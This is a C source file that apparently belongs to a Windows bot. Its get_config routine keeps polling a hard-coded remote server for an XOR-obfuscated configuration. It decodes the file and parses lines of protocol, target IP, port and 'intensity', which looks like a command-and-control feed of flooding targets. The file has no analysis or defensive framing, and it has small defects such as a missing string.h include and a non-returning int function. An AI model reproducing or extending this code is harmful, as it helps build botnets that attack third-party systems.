
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>

#include <curl/curl.h>
#include "webfetch2.h" 

static size_t
WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *data)
{
  size_t realsize = size * nmemb;
  struct MemoryStruct *mem = (struct MemoryStruct *)data;

  mem->memory = realloc(mem->memory, mem->size + realsize + 1);
  if (mem->memory == NULL) {
    /* out of memory! */
    printf("not enough memory (realloc returned NULL)\n");
    exit(EXIT_FAILURE);
  }

  memcpy(&(mem->memory[mem->size]), ptr, realsize);
  mem->size += realsize;
  mem->memory[mem->size] = 0;

  return realsize;
}


int get_config(void)
{
  CURL *curl_handle;
  struct MemoryStruct chunk;
  int i, nround; 

  char lines[MAXTEXT]; 
  char stmp[MAXTEXT]; 
  char *ctmp, *result = NULL; 

  chunk.memory = malloc(1);  /* will be grown as needed by the realloc above */

  curl_global_init(CURL_GLOBAL_ALL);

  /* ----------------------------------------------------*/
 nround = 0; 
 do {   // keep trying until get data

  chunk.size = 0;    /* no data at this point */

  /* init the curl session */
  curl_handle = curl_easy_init();

  /* specify URL to get */
  curl_easy_setopt(curl_handle, CURLOPT_URL, "http://navm.dtip.info/config.txt");

  /* send all data to this function  */
  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);

  /* we pass our 'chunk' struct to the callback function */
  curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, (void *)&chunk);

  /* some servers don't like requests that are made without a user-agent
     field, so we provide one */
  curl_easy_setopt(curl_handle, CURLOPT_USERAGENT, "libcurl-agent/1.0");

  /* get it! */
  curl_easy_perform(curl_handle);

  /* cleanup curl stuff */
  curl_easy_cleanup(curl_handle);

  /*
   * Now, our chunk.memory points to a memory block that is chunk.size
   * bytes big and contains the remote file.
   *
   * Do something nice with it!
   *
   * You should be aware of the fact that at this point we might have an
   * allocated data block, and nothing has yet deallocated that data. So when
   * you're done with it, you should free() it as a nice application.
   */

  printf("%lu bytes retrieved\n", (long)chunk.size);
  nround = ( nround < 300) ? nround+1 : 300;   // increasing delay until 5 min        
  Sleep(nround * 1000); 
 } while (chunk.size==0); 
 /* --------------------------------------------------------*/
  dec_config(chunk.memory, (int)chunk.size); 
 // printf("Decoded data: \n"); 
 // printf("%s\n", chunk.memory); 

  for(i=0; i<MAXLINES; i++) {
     memset(proto[i], 0, MAXTEXT);
     memset(ipstr[i], 0, MAXTEXT);
  }

  result = strtok ( chunk.memory, "\n" ); 
  i=0; 
  while( result != NULL ) {
    memset(lines, 0, MAXTEXT);
    strncpy(lines, result,  MAXTEXT); 
    if ( strstr(lines, "#") == lines ) {    // skip comment lines 
      result = strtok( NULL, "\n" );
      continue;   
    }
    // break up "tcp://12.34.55.78:80 8"
    strncpy(proto[i], lines, strstr(lines, "://") - lines ); 
    ctmp = strstr(lines, "://") + 3; 
    if (strstr(ctmp, ":") == NULL ) { 
     strncpy(ipstr[i], ctmp, strstr(ctmp, " ") - ctmp ); 
     port[i] = 0; 
    } else { 
     strncpy(ipstr[i], ctmp, strstr(ctmp, ":") - ctmp ); 
     ctmp = strstr(ctmp, ":") + 1; 
     memset(stmp, 0, MAXTEXT);
     strncpy(stmp, ctmp, strstr(ctmp, " ") - ctmp); 
     port[i] = atoi( stmp ); 
    }
    ctmp = strstr(ctmp, " ") + 1; 
    memset(stmp, 0, MAXTEXT);
    strncpy(stmp, ctmp, strlen(ctmp)); 
    intensity[i] = atoi( stmp ); 
    i++;  
    result = strtok( NULL, "\n" );
}
  Nconfig = i; 
  printf("%d lines received\n", Nconfig); 

/*---
 for (i=0; i<Nconfig; i++) { 
  printf("protocol:%s ip:%s port:%d intensity:%d\n", proto[i], ipstr[i], port[i],
         intensity[i]);  
 }
--*/

  if(chunk.memory)
    free(chunk.memory);

  /* we're done with libcurl, so clean it up */
  curl_global_cleanup();

  return 0;
}

int dec_config(char *buf, int len) {

  int i;
  char key;
  for (i=0; i<len; i++) {
   key=((i+64)*63)%128;
   buf[i] = buf[i] ^ key;
  }

}

